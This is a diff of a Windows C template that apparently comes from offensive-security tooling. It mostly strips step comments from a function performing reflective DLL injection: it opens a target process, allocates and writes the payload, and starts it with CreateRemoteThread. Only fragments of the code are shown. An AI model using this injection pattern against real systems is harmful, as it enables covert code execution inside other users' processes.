@@ -1,5 +1,3 @@
-// filename: main.c.tpl
-
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -372,9 +370,6 @@ int execute_technique(
     DWORD wait_result;
 
 
-    /*
-     * 1. Input validation
-     */
     if (!payload ||
         payload_len == 0 ||
         pid == 0)
@@ -388,9 +383,6 @@ int execute_technique(
     }
 
 
-    /*
-     * 2. Locate ReflectiveLoader locally
-     */
     loader_offset =
         find_export_file_offset(
             payload,
@@ -411,9 +403,6 @@ int execute_technique(
     }
 
 
-    /*
-     * 3. Open target
-     */
     hProcess = OpenProcess(
         PROCESS_CREATE_THREAD |
         PROCESS_QUERY_INFORMATION |
@@ -434,9 +423,6 @@ int execute_technique(
     }
 
 
-    /*
-     * 4. Allocate remote storage
-     */
     pRemoteImage = VirtualAllocEx(
         hProcess,
         NULL,
@@ -456,9 +442,6 @@ int execute_technique(
     }
 
 
-    /*
-     * 5. Copy DLL
-     */
     if (!WriteProcessMemory(
             hProcess,
             pRemoteImage,
@@ -482,9 +465,6 @@ int execute_technique(
     }
 
 
-    /*
-     * Make sure the whole DLL was written.
-     */
     if (bytesWritten != payload_len)
     {
         fprintf(
@@ -507,9 +487,6 @@ int execute_technique(
     }
 
 
-    /*
-     * Synchronize instruction cache.
-     */
     FlushInstructionCache(
         hProcess,
         pRemoteImage,
@@ -518,10 +495,8 @@ int execute_technique(
 
 
     /*
-     * 6. Loader location
-     *
-     * loader_offset is the RAW file offset
-     * we validated earlier.
+     * loader_offset is the validated raw file offset
+     * of ReflectiveLoader within the staged image.
      */
     LPVOID pRemoteLoader =
         (LPVOID)(
@@ -530,9 +505,6 @@ int execute_technique(
         );
 
 
-    /*
-     * 7. Create the remote loader thread.
-     */
     hThread = CreateRemoteThread(
         hProcess,
         NULL,
@@ -544,9 +516,6 @@ int execute_technique(
     );
 
 
-    /*
-     * 8. If the thread was not created
-     */
     if (!hThread)
     {
         print_win32_error(
@@ -565,9 +534,6 @@ int execute_technique(
     }
 
 
-    /*
-     * 9. Wait
-     */
     wait_result =
         WaitForSingleObject(
             hThread,
@@ -605,9 +571,6 @@ int execute_technique(
     }
 
 
-    /*
-     * 10. Capture remote loader result
-     */
     DWORD thread_exit = 0;
 
     if (!GetExitCodeThread(
@@ -637,9 +600,6 @@ int execute_technique(
     );
 
 
-    /*
-     * 11. Cleanup
-     */
     CloseHandle(hThread);
 
     VirtualFreeEx(
@@ -656,9 +616,6 @@ int execute_technique(
 
 
 
-/*
- * Program entry point.
- */
 int main(
     int argc,
     char **argv
